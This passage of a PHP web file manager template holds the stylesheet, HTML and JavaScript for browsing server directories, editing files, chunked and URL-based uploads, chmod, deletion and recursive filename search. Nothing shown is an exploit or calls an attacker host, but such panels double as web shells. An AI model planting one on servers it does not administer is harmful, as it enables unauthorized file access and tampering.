.btn-purple{background:linear-gradient(135deg,#7c3aed,#a78bfa);color:#fff}
.btn-warn{background:linear-gradient(135deg,#d97706,#fbbf24);color:#1a1a1a}
.btn-sm{padding:6px 11px;font-size:.75rem;border-radius:6px}

/* Panels */
.panel{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius-lg);margin-bottom:20px;box-shadow:var(--shadow);overflow:hidden}
.panel-header{padding:16px 22px;border-bottom:1px solid var(--border);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;background:var(--surface2)}
.panel-title{font-size:.9375rem;font-weight:600;color:var(--text);display:flex;align-items:center;gap:8px}
.panel-meta{font-size:.75rem;color:var(--muted);background:var(--bg);padding:4px 10px;border-radius:99px;border:1px solid var(--border);font-weight:500}
.panel-body{padding:0}

/* Table */
table{width:100%;border-collapse:collapse}
td,th{padding:13px 18px;text-align:left;border-bottom:1px solid var(--border)}
th{background:var(--bg);color:var(--muted);font-size:.6875rem;text-transform:uppercase;letter-spacing:.08em;font-weight:600}
tbody tr{transition:background var(--transition)}
tbody tr:hover{background:rgba(56,189,248,.03)}
tbody tr:last-child td{border-bottom:none}
.icon{display:inline-flex;align-items:center;justify-content:center;width:22px;height:22px;margin-right:10px;font-size:16px;flex-shrink:0;font-family:'Segoe UI Emoji','Apple Color Emoji','Noto Color Emoji',sans-serif}
.icon-dir{filter:drop-shadow(0 0 6px rgba(56,189,248,.3))}
.icon-file{filter:drop-shadow(0 0 6px rgba(167,139,250,.3))}
.name-cell{display:flex;align-items:center;min-width:0}
.name-cell a,.name-cell span{font-weight:500;color:var(--text);text-decoration:none;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.name-cell a:hover{color:var(--accent)}
.size{color:var(--muted);font-size:.8125rem;font-family:var(--mono)}
.perm{font-family:var(--mono);background:var(--bg);padding:3px 8px;border-radius:5px;font-size:.75rem;color:var(--muted2);border:1px solid var(--border)}
.date-cell{color:var(--muted);font-size:.8125rem}
.actions-cell{display:flex;gap:5px;flex-wrap:wrap;justify-content:flex-end}
th.actions-col,td.actions-col{text-align:right}

/* Alerts */
.alert{padding:13px 16px;border-radius:var(--radius);margin-bottom:16px;font-size:.875rem;font-weight:500;display:flex;align-items:center;gap:8px}
.alert-success{background:var(--success-bg);border:1px solid rgba(52,211,153,.3);color:var(--success)}
.alert-error{background:var(--danger-bg);border:1px solid rgba(248,113,113,.3);color:var(--danger)}

/* Modals */
.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.65);backdrop-filter:blur(6px);z-index:1000;justify-content:center;align-items:center;padding:20px}
.modal.active{display:flex}
.modal-content{background:var(--surface);border:1px solid var(--border2);border-radius:var(--radius-lg);width:100%;max-width:480px;padding:28px;box-shadow:0 24px 64px rgba(0,0,0,.5)}
.modal-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px}
.modal-title{font-size:1.0625rem;font-weight:600;color:var(--text)}
.close{background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--muted);font-size:18px;cursor:pointer;width:32px;height:32px;display:flex;align-items:center;justify-content:center;transition:all var(--transition)}
.close:hover{color:var(--text);background:var(--surface3)}
.form-group{margin-bottom:16px}
.form-group label{display:block;margin-bottom:7px;font-size:.75rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.06em}
.form-control{width:100%;padding:11px 14px;background:var(--bg);border:1px solid var(--border);border-radius:8px;color:var(--text);font-family:var(--font);font-size:.875rem;transition:border-color var(--transition),box-shadow var(--transition)}
.form-control:focus{outline:0;border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}
textarea.form-control{min-height:420px;font-family:var(--mono);font-size:.8125rem;line-height:1.6;resize:vertical}
.checkbox-wrapper{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
.checkbox-wrapper label{color:var(--text2);font-size:.875rem;cursor:pointer}
.quick-actions{display:flex;flex-wrap:wrap;gap:20px;padding:18px 22px}
.quick-form{flex:1;min-width:240px}
.quick-form>label{font-size:.75rem;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:.06em}
.quick-form-row{display:flex;gap:8px;margin-top:8px}
.row-check{width:15px;height:15px;accent-color:var(--accent);cursor:pointer}
.empty-state{text-align:center;padding:64px 24px;color:var(--muted)}
.empty-state::before{content:'📂';display:block;font-size:2.5rem;margin-bottom:12px;opacity:.5}
.edit-panel{margin-top:4px}
.edit-header{background:var(--surface2);padding:16px 22px;border:1px solid var(--border);border-radius:var(--radius-lg) var(--radius-lg) 0 0;display:flex;justify-content:space-between;align-items:center}
.edit-header strong{color:var(--accent)}
.edit-body{border:1px solid var(--border);border-top:none;border-radius:0 0 var(--radius-lg) var(--radius-lg);overflow:hidden}
.edit-footer{padding:16px 22px;background:var(--bg);border-top:1px solid var(--border);display:flex;gap:8px}
#uploadProgressWrap{display:none;height:6px;background:var(--surface3);border-radius:99px;margin:10px 0;overflow:hidden}
#uploadProgress{width:0;height:100%;background:linear-gradient(90deg,#0ea5e9,#34d399);border-radius:99px;transition:width .3s ease}
.hint{font-size:.75rem;color:var(--muted);margin-top:4px}
#uploadStatus{font-size:.8125rem;color:var(--muted2);margin:8px 0}
@media(max-width:768px){.sidebar{width:100%;border-right:none;border-bottom:1px solid var(--border)}.wrapper{flex-direction:column}.main{padding:16px}}
</style>
</head>
<body>
<div class="wrapper">
<aside class="sidebar">
<div class="logo"><h2><?php echo APP_TITLE; ?></h2><span>File Manager</span></div>
<nav class="sidebar-nav">
<a href="<?php echo path_query($root); ?>" class="nav-item<?php echo $path === $root ? ' active' : ''; ?>">&#127968; Home Directory</a>
<a href="<?php echo path_query(dirname($path) !== '.' ? norm_path(dirname($path)) : $root); ?>" class="nav-item">&#11014; Parent</a>
<a href="#" class="nav-item" onclick="showModal('uploadModal');return false">&#128228; Upload</a>
<a href="#" class="nav-item" onclick="showModal('urlModal');return false">&#127760; URL Upload</a>
<a href="#" class="nav-item" onclick="showModal('findModal');return false">&#128269; Find</a>
<?php if ($clipboard) { ?>
<form method="POST" style="margin:0"><button type="submit" name="clip_paste" value="1" class="nav-item" style="width:100%;border:none;background:none;cursor:pointer;text-align:left;font-family:var(--font)">&#128203; Paste (<?php echo count($clipboard['paths']); ?> <?php echo $clipboard['mode'] === 'cut' ? 'cut' : 'copied'; ?>)</button></form>
<?php } ?>
<a href="#" class="nav-item" onclick="showModal('createModal');return false">&#10133; New Item</a>
<a href="#" class="nav-item" onclick="location.reload();return false">&#128260; Refresh</a>
<a href="?logout=1" class="nav-item">&#128682; Logout</a>
</nav>
<div class="stats">
<h4>Server Info</h4>
<div class="stat-item"><span>PHP</span><span><?php echo phpversion(); ?></span></div>
<div class="stat-item"><span>Disk</span><span><?php echo $disk_pct; ?>%</span></div>
<div class="progress"><div class="progress-bar" style="width:<?php echo $disk_pct; ?>%"></div></div>
<div class="stat-item" style="margin-top:8px"><span>Free</span><span><?php echo $disk_free ? format_bytes($disk_free) : '-'; ?></span></div>
</div>
</aside>
<main class="main">
<?php if ($msg) { ?><div class="alert alert-success">&#9989; <?php echo htmlspecialchars($msg); ?></div><?php } ?>
<?php if ($err) { ?><div class="alert alert-error">&#10060; <?php echo htmlspecialchars($err); ?></div><?php } ?>
<div class="header">
<div>
<?php render_breadcrumb($path, $root); ?>
</div>
<div class="actions">
<?php if ($clipboard) { ?>
<form method="POST" style="display:inline;margin:0"><button type="submit" name="clip_paste" value="1" class="btn btn-warn">&#128203; Paste (<?php echo count($clipboard['paths']); ?>)</button></form>
<?php } ?>
<button class="btn btn-ghost" onclick="showModal('findModal')">&#128269; Find</button>
<button class="btn btn-purple" onclick="showModal('urlModal')">&#127760; URL</button>
<button class="btn btn-success" onclick="showModal('createModal')">&#10133; New</button>
<button class="btn btn-primary" onclick="showModal('uploadModal')">&#128228; Upload</button>
</div>
</div>

<?php if ($edit_name) { ?>
<div class="edit-panel">
<div class="edit-header"><span>&#9998; Editing: <strong><?php echo htmlspecialchars($edit_name); ?></strong></span>
<a href="<?php echo $rq; ?>" class="btn btn-sm btn-ghost">&#8592; Back</a></div>
<div class="edit-body">
<form method="POST">
<input type="hidden" name="fn" value="<?php echo htmlspecialchars($edit_name); ?>">
<textarea class="form-control" name="ct" style="border-radius:0;border:none;border-top:1px solid var(--border)"><?php echo htmlspecialchars($edit_content); ?></textarea>
<div class="edit-footer">
<button type="submit" name="s" value="1" class="btn btn-success">&#128190; Save Changes</button>
<a href="<?php echo $rq; ?>" class="btn btn-sm btn-ghost">Cancel</a>
</div></form></div></div>
<?php } else { ?>

<div class="panel">
<div class="panel-header"><span class="panel-title">&#9881; Quick Actions</span></div>
<div class="quick-actions">
<form method="POST" class="quick-form"><label>New File</label><div class="quick-form-row">
<input type="text" name="filename" class="form-control" placeholder="file.txt" required>
<button type="submit" name="newfile" value="1" class="btn btn-success btn-sm">Create</button></div></form>
<form method="POST" class="quick-form"><label>New Dir</label><div class="quick-form-row">
<input type="text" name="dirname" class="form-control" placeholder="folder" required>
<button type="submit" name="newdir" value="1" class="btn btn-success btn-sm">Create</button></div></form>
<form method="GET" class="quick-form"><label>Find in folder</label><div class="quick-form-row">
<input type="hidden" name="p" value="<?php echo htmlspecialchars($path); ?>">
<input type="hidden" name="find" value="1">
<input type="text" name="q" class="form-control" placeholder="filename..." value="<?php echo htmlspecialchars($find_query); ?>" required>
<button type="submit" class="btn btn-ghost btn-sm">Search</button></div></form>
</div></div>

<?php if ($find_active) { ?>
<div class="panel">
<div class="panel-header">
<span class="panel-title">&#128269; Find: "<?php echo htmlspecialchars($find_query); ?>"</span>
<span class="panel-meta"><?php echo count($find_results); ?> result(s)</span>
</div>
<div class="panel-body">
<?php if (empty($find_results)) { ?>
<div class="empty-state">No matches found</div>
<?php } else { ?>
<table>
<thead><tr><th>Name</th><th>Path</th><th>Size</th><th>Modified</th><th class="actions-col">Actions</th></tr></thead>
<tbody>
<?php foreach ($find_results as $hit) {
    $hn = $hit['name'];
    $hp = $hit['path'];
    $hisd = $hit['is_dir'];
?>
<tr>
<td><div class="name-cell"><span class="icon <?php echo $hisd ? 'icon-dir' : 'icon-file'; ?>"><?php echo $hisd ? '&#128193;' : '&#128196;'; ?></span><?php if ($hisd) { ?><a href="<?php echo path_query($hp); ?>"><?php echo htmlspecialchars($hn); ?></a><?php } else { ?><span><?php echo htmlspecialchars($hn); ?></span><?php } ?></div></td>
<td class="size" style="font-size:.75rem;max-width:280px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="<?php echo htmlspecialchars($hp); ?>"><?php echo htmlspecialchars($hp); ?></td>
<td class="size"><?php echo $hit['size']; ?></td>
<td class="date-cell"><?php echo $hit['modified']; ?></td>
<td class="actions-col"><div class="actions-cell">
<?php if ($hisd) { ?><a href="<?php echo path_query($hp); ?>" class="btn btn-sm btn-primary">Open</a><?php } else { ?>
<a href="<?php echo path_query(dirname($hp)); ?>&e=<?php echo urlencode($hn); ?>" class="btn btn-sm btn-primary">Edit</a>
<a href="?download=<?php echo urlencode($hp); ?>" class="btn btn-sm btn-ghost">Download</a>
<?php } ?></div></td></tr>
<?php } ?>
</tbody></table>
<?php } ?>
</div></div>
<?php } ?>

<div class="panel">
<div class="panel-header">
<span class="panel-title">&#128194; <?php echo htmlspecialchars(basename($path) ?: $path); ?></span>
<div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap">
<button type="submit" form="bulkForm" name="clip_copy" value="1" id="bulkCopyBtn" class="btn btn-sm btn-ghost" style="display:none">&#128203; Copy</button>
<button type="submit" form="bulkForm" name="clip_cut" value="1" id="bulkCutBtn" class="btn btn-sm btn-warn" style="display:none">&#9986; Cut</button>
<button type="button" id="bulkZipBtn" class="btn btn-sm btn-purple" style="display:none" onclick="showZipModal()">&#128230; ZIP</button>
<button type="submit" form="bulkForm" name="bd" value="1" id="bulkDeleteBtn" class="btn btn-sm btn-danger" style="display:none" onclick="return confirmBulkDelete()">&#128465; Delete Selected</button>
<span class="panel-meta" title="<?php echo htmlspecialchars($path); ?>"><?php echo count_dir_items($items); ?> items</span>
</div></div>
<div class="panel-body">
<form method="POST" id="bulkForm">
<table>
<thead><tr>
<th style="width:4%"><input type="checkbox" id="selectAll" class="row-check" onclick="toggleSelectAll(this)"></th>
<th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th class="actions-col">Actions</th>
</tr></thead><tbody>
<?php
$parent_real = @realpath(dirname($path));
$show_parent = ($parent_real !== false && norm_path($parent_real) !== norm_path($path));
if ($show_parent) {
    $parent_name = basename(norm_path($parent_real));
?>
<tr class="dir-parent">
<td></td>
<td><div class="name-cell"><span class="icon icon-dir">&#128194;</span><a href="<?php echo path_query(norm_path($parent_real)); ?>">.. <span style="color:var(--muted);font-weight:400">(<?php echo htmlspecialchars($parent_name); ?>)</span></a></div></td>
<td class="size">-</td>
<td><span class="perm">-</span></td>
<td class="date-cell">-</td>
<td class="actions-col"></td>
</tr>
<?php }
if (empty($items) || (!$show_parent && count_dir_items($items) === 0)) { ?>
<tr><td colspan="6"><div class="empty-state">This directory is empty</div></td></tr>
<?php } else { foreach ($items as $item) {
    if ($item['name'] === '..') { continue; }
    $n = $item['name'];
    $isd = $item['is_dir'];
?>
<tr>
<td><?php if ($n !== '..') { ?><input type="checkbox" class="row-check item-sel" name="sel[]" value="<?php echo htmlspecialchars($n); ?>" onchange="updateBulkBtn()"><?php } ?></td>
<td><div class="name-cell"><span class="icon <?php echo $isd ? 'icon-dir' : 'icon-file'; ?>"><?php echo $isd ? '&#128193;' : '&#128196;'; ?></span><?php if ($isd) { ?><a href="<?php echo path_query($item['path']); ?>"><?php echo htmlspecialchars($n); ?></a>
<?php } else { ?><span><?php echo htmlspecialchars($n); ?></span><?php } ?></div></td>
<td class="size"><?php echo $item['size']; ?></td>
<td><span class="perm"><?php echo $item['perms']; ?></span></td>
<td class="date-cell"><?php echo $item['modified']; ?></td>
<td class="actions-col"><div class="actions-cell">
<?php if (!$isd) { ?><a href="<?php echo $rq; ?>&e=<?php echo urlencode($n); ?>" class="btn btn-sm btn-primary">Edit</a><?php } ?>
<form method="POST" style="display:inline;margin:0"><input type="hidden" name="clip_one" value="<?php echo htmlspecialchars($item['path']); ?>"><input type="hidden" name="clip_mode" value="copy"><button type="submit" class="btn btn-sm btn-ghost" title="Copy">&#128203;</button></form>
<form method="POST" style="display:inline;margin:0"><input type="hidden" name="clip_one" value="<?php echo htmlspecialchars($item['path']); ?>"><input type="hidden" name="clip_mode" value="cut"><button type="submit" class="btn btn-sm btn-warn" title="Cut">&#9986;</button></form>
<button type="button" class="btn btn-sm btn-purple" onclick="showRename('<?php echo htmlspecialchars($item['path'], ENT_QUOTES); ?>','<?php echo htmlspecialchars($n, ENT_QUOTES); ?>')">Rename</button>
<button type="button" class="btn btn-sm btn-warn" onclick="showChmod('<?php echo htmlspecialchars($item['path'], ENT_QUOTES); ?>','<?php echo $item['perms']; ?>')">Chmod</button>
<?php $cmsg = $isd ? 'Delete folder and all contents?' : 'Delete this file?'; ?>
<a href="<?php echo $rq; ?>&delete=<?php echo urlencode($item['path']); ?>" data-confirm="<?php echo htmlspecialchars($cmsg, ENT_QUOTES); ?>" onclick="return confirmDelete(this)" class="btn btn-sm btn-danger">Delete</a>
<?php if (!$isd) { ?><a href="?download=<?php echo urlencode($item['path']); ?>" class="btn btn-sm btn-ghost">Download</a><?php } ?>
<?php if (!$isd && preg_match('/\.zip$/i', $n) && zip_supported()) { ?>
<form method="POST" style="display:inline;margin:0"><input type="hidden" name="zip_file" value="<?php echo htmlspecialchars($item['path']); ?>"><button type="submit" name="extract_zip" value="1" class="btn btn-sm btn-success" onclick="return confirm('ZIP dosyasini bu klasore ac?')">Unzip</button></form>
<?php } ?>
</div></td></tr>
<?php } } ?>
</tbody></table></form></div></div>
<?php } ?>
</main></div>

<div class="modal" id="uploadModal"><div class="modal-content">
<div class="modal-header"><span class="modal-title">&#128228; Upload</span><button class="close" onclick="hideModal('uploadModal')">&times;</button></div>
<form id="uploadForm" onsubmit="return handleUploadSubmit(event)">
<div class="form-group"><label>Type</label><div class="checkbox-wrapper">
<input type="radio" name="uploadMode" id="modeFiles" value="files" checked onchange="setUploadMode('files')"><label for="modeFiles">Multiple Files</label>
<input type="radio" name="uploadMode" id="modeFolder" value="folder" onchange="setUploadMode('folder')"><label for="modeFolder">Folder</label></div></div>
<div class="form-group"><label id="uploadLabel">Select Files</label>
<input type="file" id="uploadInput" class="form-control" multiple required></div>
<p id="uploadHint" class="hint">Select one or more files.</p>
<div id="uploadStatus"></div>
<div id="uploadProgressWrap"><div id="uploadProgress"></div></div>
<button type="submit" class="btn btn-success" id="uploadBtn">Upload</button>
<button type="button" class="btn btn-ghost" onclick="hideModal('uploadModal')">Cancel</button>
</form></div></div>

<div class="modal" id="createModal"><div class="modal-content">
<div class="modal-header"><span class="modal-title">&#10133; Create</span><button class="close" onclick="hideModal('createModal')">&times;</button></div>
<form method="POST"><div class="form-group"><label>Type</label><div class="checkbox-wrapper">
<input type="radio" name="createType" id="ctFile" value="file" checked onchange="setCreateType('file')"><label for="ctFile">File</label>
<input type="radio" name="createType" id="ctDir" value="dir" onchange="setCreateType('dir')"><label for="ctDir">Folder</label></div></div>
<div class="form-group"><label id="createLabel">Name</label><input type="text" id="createName" class="form-control" required></div>
<button type="submit" class="btn btn-success" id="createSubmit" name="newfile" value="1">Create</button>
<input type="hidden" name="filename" id="createFilenameHidden">
<input type="hidden" name="dirname" id="createDirnameHidden">
</form></div></div>

<div class="modal" id="renameModal"><div class="modal-content">
<div class="modal-header"><span class="modal-title">&#9998; Rename</span><button class="close" onclick="hideModal('renameModal')">&times;</button></div>
<form method="POST"><input type="hidden" name="rename" id="renamePath">
<div class="form-group"><label>Current</label><input id="renameCurrent" class="form-control" readonly style="background:#21262d"></div>
<div class="form-group"><label>New Name</label><input name="newname" class="form-control" required></div>
<button type="submit" name="rn" value="1" class="btn btn-success">Rename</button>
</form></div></div>

<div class="modal" id="chmodModal"><div class="modal-content">
<div class="modal-header"><span class="modal-title">&#128272; Chmod</span><button class="close" onclick="hideModal('chmodModal')">&times;</button></div>
<form method="POST"><input type="hidden" name="chmod" id="chmodPath">
<div class="form-group"><label>File</label><input id="chmodTarget" class="form-control" readonly style="background:#21262d"></div>
<div class="form-group"><label>Mode</label><input name="mode" id="chmodMode" class="form-control" required></div>
<button type="submit" class="btn btn-success">Apply</button>
</form></div></div>

<div class="modal" id="findModal"><div class="modal-content">
<div class="modal-header"><span class="modal-title">&#128269; Find Files</span><button class="close" onclick="hideModal('findModal')">&times;</button></div>
<form method="GET">
<input type="hidden" name="p" value="<?php echo htmlspecialchars($path); ?>">
<input type="hidden" name="find" value="1">
<div class="form-group"><label>Search term (filename contains)</label>
<input type="text" name="q" class="form-control" placeholder="config, .php, backup..." required autofocus></div>
<p class="hint">Searches recursively in current folder (max 200 results).</p>
<button type="submit" class="btn btn-success">Search</button>
<button type="button" class="btn btn-ghost" onclick="hideModal('findModal')">Cancel</button>
</form></div></div>

<div class="modal" id="urlModal"><div class="modal-content">
<div class="modal-header"><span class="modal-title">&#127760; URL Upload</span><button class="close" onclick="hideModal('urlModal')">&times;</button></div>
<form method="POST">
<div class="form-group"><label>File URL</label>
<input type="url" name="file_url" class="form-control" placeholder="https://example.com/file.zip" required></div>
<div class="form-group"><label>Save as (optional)</label>
<input type="text" name="url_filename" class="form-control" placeholder="Leave empty to use URL filename"></div>
<p class="hint">Downloads to current directory: <?php echo htmlspecialchars(basename($path)); ?></p>
<button type="submit" name="url_upload" value="1" class="btn btn-success">Download</button>
<button type="button" class="btn btn-ghost" onclick="hideModal('urlModal')">Cancel</button>
</form></div></div>

<div class="modal" id="zipModal"><div class="modal-content">
<div class="modal-header"><span class="modal-title">&#128230; Create ZIP</span><button class="close" onclick="hideModal('zipModal')">&times;</button></div>
<form method="POST" id="zipForm">
<div id="zipSelInputs"></div>
<div class="form-group"><label>ZIP filename</label>
<input type="text" name="zip_name" class="form-control" placeholder="archive.zip" value="archive_<?php echo date('Ymd_His'); ?>.zip"></div>
<p class="hint">Selected items will be compressed into current folder.</p>
<button type="submit" name="zip_sel" value="1" class="btn btn-success">Create ZIP</button>
<button type="button" class="btn btn-ghost" onclick="hideModal('zipModal')">Cancel</button>
</form></div></div>

<script>
var CURRENT_PATH = <?php echo json_encode($path); ?>;
var CHUNK_SIZE = 1024 * 1024;

function showModal(id){document.getElementById(id).classList.add('active');if(id==='uploadModal')setUploadMode('files')}
function hideModal(id){document.getElementById(id).classList.remove('active')}
function setUploadMode(m){var i=document.getElementById('uploadInput'),h=document.getElementById('uploadHint'),l=document.getElementById('uploadLabel');
if(m==='folder'){i.setAttribute('webkitdirectory','');i.setAttribute('directory','');i.setAttribute('multiple','');l.textContent='Select Folder';h.textContent='Folder structure will be preserved.'}
else{i.removeAttribute('webkitdirectory');i.removeAttribute('directory');i.setAttribute('multiple','');l.textContent='Select Files';h.textContent='Select one or more files.'}i.value=''}
function setCreateType(t){var s=document.getElementById('createSubmit'),l=document.getElementById('createLabel');
if(t==='dir'){s.name='newdir';l.textContent='Folder Name'}else{s.name='newfile';l.textContent='File Name'}}
document.getElementById('createModal').querySelector('form').onsubmit=function(){
var n=document.getElementById('createName').value;
if(document.getElementById('ctDir').checked){document.getElementById('createDirnameHidden').value=n;document.getElementById('createFilenameHidden').name=''}
else{document.getElementById('createFilenameHidden').value=n;document.getElementById('createDirnameHidden').name=''}};
function showRename(path,name){document.getElementById('renamePath').value=path;document.getElementById('renameCurrent').value=name;showModal('renameModal')}
function showChmod(path,perms){document.getElementById('chmodPath').value=path;document.getElementById('chmodTarget').value=path.split('/').pop();document.getElementById('chmodMode').value=perms;showModal('chmodModal')}
function confirmDelete(el){if(!confirm(el.getAttribute('data-confirm')||'Sure?'))return false;window.location.replace(el.href+'&_='+Date.now());return false}
function toggleSelectAll(cb){document.querySelectorAll('.item-sel').forEach(function(c){c.checked=cb.checked});updateBulkBtn()}
function updateBulkBtn(){
var n=document.querySelectorAll('.item-sel:checked').length;
['bulkDeleteBtn','bulkCopyBtn','bulkCutBtn','bulkZipBtn'].forEach(function(id){
var b=document.getElementById(id);if(b)b.style.display=n>0?'inline-flex':'none';
});
}
function confirmBulkDelete(){return confirm('Delete selected items?')}
function showZipModal(){
var wrap=document.getElementById('zipSelInputs');wrap.innerHTML='';
document.querySelectorAll('.item-sel:checked').forEach(function(c){
var inp=document.createElement('input');inp.type='hidden';inp.name='sel[]';inp.value=c.value;wrap.appendChild(inp);
});
showModal('zipModal');
}

function handleUploadSubmit(ev){
ev.preventDefault();
var files=document.getElementById('uploadInput').files;
if(!files||!files.length)return false;
uploadFiles(Array.from(files));
return false;
}

function uploadFiles(files){
var status=document.getElementById('uploadStatus'),wrap=document.getElementById('uploadProgressWrap'),bar=document.getElementById('uploadProgress'),btn=document.getElementById('uploadBtn');
var queue=files,fileIndex=0;
wrap.style.display='block';bar.style.width='0%';btn.disabled=true;btn.textContent='Uploading...';
function uploadNextFile(){
if(fileIndex>=queue.length){status.textContent=queue.length+' file(s) uploaded. Reloading...';bar.style.width='100%';setTimeout(function(){location.reload()},1500);return}
var file=queue[fileIndex],rel=file.webkitRelativePath||file.name,total=Math.ceil(file.size/CHUNK_SIZE)||1,chunk=0;
status.textContent='Uploading ('+(fileIndex+1)+'/'+queue.length+'): '+rel;
function sendChunk(){
if(chunk>=total){fileIndex++;uploadNextFile();return}
var start=chunk*CHUNK_SIZE,end=Math.min(start+CHUNK_SIZE,file.size),blob=file.slice(start,end);
var fd=new FormData();
fd.append('action','upload_chunk');fd.append('chunk',blob,file.name);
fd.append('chunk_num',chunk);fd.append('total_chunks',total);
fd.append('filename',file.name);fd.append('relative_path',rel);fd.append('p',CURRENT_PATH);
fetch(location.pathname+'?p='+encodeURIComponent(CURRENT_PATH),{method:'POST',body:fd,credentials:'same-origin'})
.then(function(r){return r.json()}).then(function(data){
if(data.status==='error'){status.textContent='Error: '+data.message;btn.disabled=false;btn.textContent='Upload';return}
chunk++;
bar.style.width=Math.round(((fileIndex+(chunk/total))/queue.length)*100)+'%';
if(data.status==='success'){fileIndex++;uploadNextFile()}else{status.textContent=data.message;sendChunk()}
}).catch(function(e){status.textContent='Upload failed: '+e;btn.disabled=false;btn.textContent='Upload'});
}
if(total===0){fileIndex++;uploadNextFile();return}
sendChunk();
}
uploadNextFile();
}

window.onclick=function(e){if(e.target.classList.contains('modal'))e.target.classList.remove('active')};
</script>
</body></html>
